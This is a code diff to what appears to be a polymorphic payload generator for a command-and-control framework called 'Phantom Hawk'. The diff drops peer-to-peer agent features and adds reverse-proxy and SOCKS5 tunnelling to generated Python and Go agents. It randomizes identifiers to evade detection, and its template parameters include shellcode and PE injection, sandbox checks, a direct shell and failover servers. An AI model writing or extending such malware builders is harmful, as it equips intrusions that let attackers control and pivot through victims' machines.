@@ -194,8 +194,8 @@ class PayloadGenerator:
         headers = profile_config.get('headers', {'User-Agent': 'Python C2 Agent'})
         heartbeat = profile_config.get('heartbeat_interval', 60)
         jitter = profile_config.get('jitter', 0.2)
-        p2p_enabled = profile_config.get('p2p_enabled', False)
-        p2p_port = profile_config.get('p2p_port', 8888)
+        p2p_enabled = False  # P2P functionality has been removed
+        p2p_port = 8888  # Default port value for template compatibility
 
         class_name = poly.generate_random_name('Agent')
 
@@ -232,15 +232,6 @@ class PayloadGenerator:
         m_start_direct_shell = poly.generate_random_name('start_direct_shell_')
         m_handle_direct_shell = poly.generate_random_name('handle_direct_shell_')
 
-        m_start_p2p_server = poly.generate_random_name('start_p2p_server_')
-        m_stop_p2p_server = poly.generate_random_name('stop_p2p_server_')
-        m_discover_local_agents = poly.generate_random_name('discover_local_agents_')
-        m_broadcast_presence = poly.generate_random_name('broadcast_presence_')
-        m_handle_p2p_request = poly.generate_random_name('handle_p2p_request_')
-        m_forward_command = poly.generate_random_name('forward_command_')
-        m_receive_forwarded_command = poly.generate_random_name('receive_forwarded_command_')
-        m_p2p_worker = poly.generate_random_name('p2p_worker_')
-        m_setup_p2p_communication = poly.generate_random_name('setup_p2p_comm_')
 
         m_encrypt_data = poly.generate_random_name('encrypt_data_')
         m_decrypt_data = poly.generate_random_name('decrypt_data_')
@@ -269,12 +260,6 @@ class PayloadGenerator:
         v_secret_key = poly.generate_random_name('secret_key_')
         v_fernet = poly.generate_random_name('fernet_')
 
-        v_p2p_enabled = poly.generate_random_name('p2p_enabled_')
-        v_local_agents = poly.generate_random_name('local_agents_')
-        v_p2p_port = poly.generate_random_name('p2p_port_')
-        v_p2p_server = poly.generate_random_name('p2p_server_')
-        v_p2p_discovery_timer = poly.generate_random_name('p2p_discovery_timer_')
-        v_p2p_command_queue = poly.generate_random_name('p2p_command_queue_')
 
         v_sandbox_enabled = poly.generate_random_name('sandbox_enabled_')
 
@@ -295,6 +280,17 @@ class PayloadGenerator:
         v_in_failover_attempt = poly.generate_random_name('in_failover_attempt_')
 
         v_coffloader_b64 = poly.generate_random_name('coffloader_b64_')
+
+        # Reverse proxy variables
+        v_reverse_proxy_active = poly.generate_random_name('reverse_proxy_active_')
+        v_reverse_proxy_stop_event = poly.generate_random_name('reverse_proxy_stop_event_')
+        v_reverse_proxy_thread = poly.generate_random_name('reverse_proxy_thread_')
+
+        # Reverse proxy method names
+        m_start_reverse_proxy = poly.generate_random_name('start_reverse_proxy_')
+        m_stop_reverse_proxy = poly.generate_random_name('stop_reverse_proxy_')
+        m_handle_socks5 = poly.generate_random_name('handle_socks5_')
+        m_relay_data = poly.generate_random_name('relay_data_')
 
         if obfuscate:
             register_uri_code = poly.obfuscate_string(register_uri)
@@ -362,15 +358,6 @@ class PayloadGenerator:
             m_handle_download=m_handle_download,
             m_start_direct_shell=m_start_direct_shell,
             m_handle_direct_shell=m_handle_direct_shell,
-            m_start_p2p_server=m_start_p2p_server,
-            m_stop_p2p_server=m_stop_p2p_server,
-            m_discover_local_agents=m_discover_local_agents,
-            m_broadcast_presence=m_broadcast_presence,
-            m_handle_p2p_request=m_handle_p2p_request,
-            m_forward_command=m_forward_command,
-            m_receive_forwarded_command=m_receive_forwarded_command,
-            m_p2p_worker=m_p2p_worker,
-            m_setup_p2p_communication=m_setup_p2p_communication,
             m_encrypt_data=m_encrypt_data,
             m_decrypt_data=m_decrypt_data,
             m_check_working_hours=m_check_working_hours,
@@ -403,12 +390,6 @@ class PayloadGenerator:
             v_current_interactive_task=v_current_interactive_task,
             v_secret_key=v_secret_key,
             v_fernet=v_fernet,
-            v_p2p_enabled=v_p2p_enabled,
-            v_local_agents=v_local_agents,
-            v_p2p_port=v_p2p_port,
-            v_p2p_server=v_p2p_server,
-            v_p2p_discovery_timer=v_p2p_discovery_timer,
-            v_p2p_command_queue=v_p2p_command_queue,
             v_sandbox_enabled=v_sandbox_enabled,
             v_redirector_host=v_redirector_host,
             v_redirector_port=v_redirector_port,
@@ -441,7 +422,14 @@ class PayloadGenerator:
             redirector_port=redirector_port,
             use_redirector=str(use_redirector).lower().capitalize(),
             use_failover=str(use_failover).lower().capitalize(),
-            failover_urls=failover_urls
+            failover_urls=failover_urls,
+            v_reverse_proxy_active=v_reverse_proxy_active,
+            v_reverse_proxy_stop_event=v_reverse_proxy_stop_event,
+            v_reverse_proxy_thread=v_reverse_proxy_thread,
+            m_start_reverse_proxy=m_start_reverse_proxy,
+            m_stop_reverse_proxy=m_stop_reverse_proxy,
+            m_handle_socks5=m_handle_socks5,
+            m_relay_data=m_relay_data
         )
 
         print(f"[+] POLYMORPHIC Phantom Hawk agent generated (Class: {class_name})")
@@ -540,6 +528,16 @@ class PayloadGenerator:
         agent_get_process_id_func = poly.generate_random_name('getProcessId')
         agent_inject_shellcode_func = poly.generate_random_name('injectShellcode')
         agent_inject_pe_func = poly.generate_random_name('injectPE')
+
+        # Generate random names for reverse proxy fields
+        agent_reverse_proxy_active_field = poly.generate_go_field_name('ReverseProxyActive')
+        agent_reverse_proxy_stop_chan_field = poly.generate_go_field_name('ReverseProxyStopChan')
+        agent_reverse_proxy_lock_field = poly.generate_go_field_name('ReverseProxyLock')
+
+        # Generate random names for reverse proxy function names
+        agent_start_reverse_proxy_func = poly.generate_random_name('startReverseProxy')
+        agent_stop_reverse_proxy_func = poly.generate_random_name('stopReverseProxy')
+        agent_handle_socks5_func = poly.generate_random_name('handleSOCKS5')
 
         # Generate random names for failover functions
         agent_try_failover_func = poly.generate_random_name('tryFailover')
@@ -694,6 +692,16 @@ class PayloadGenerator:
         go_code = go_code.replace('{AGENT_MAX_FAIL_COUNT_FIELD}', agent_max_fail_count_field)
         go_code = go_code.replace('{AGENT_LAST_CONNECTION_ATTEMPT_FIELD}', agent_last_connection_attempt_field)
         go_code = go_code.replace('{AGENT_IN_FAILOVER_ATTEMPT_FIELD}', agent_in_failover_attempt_field)
+
+        # Replace reverse proxy field names
+        go_code = go_code.replace('{AGENT_REVERSE_PROXY_ACTIVE_FIELD}', agent_reverse_proxy_active_field)
+        go_code = go_code.replace('{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD}', agent_reverse_proxy_stop_chan_field)
+        go_code = go_code.replace('{AGENT_REVERSE_PROXY_LOCK_FIELD}', agent_reverse_proxy_lock_field)
+
+        # Replace reverse proxy function names
+        go_code = go_code.replace('{AGENT_START_REVERSE_PROXY_FUNC}', agent_start_reverse_proxy_func)
+        go_code = go_code.replace('{AGENT_STOP_REVERSE_PROXY_FUNC}', agent_stop_reverse_proxy_func)
+        go_code = go_code.replace('{AGENT_HANDLE_SOCKS5_FUNC}', agent_handle_socks5_func)
 
         # Convert the profile headers dictionary to Go map literal format
         go_headers_parts = []
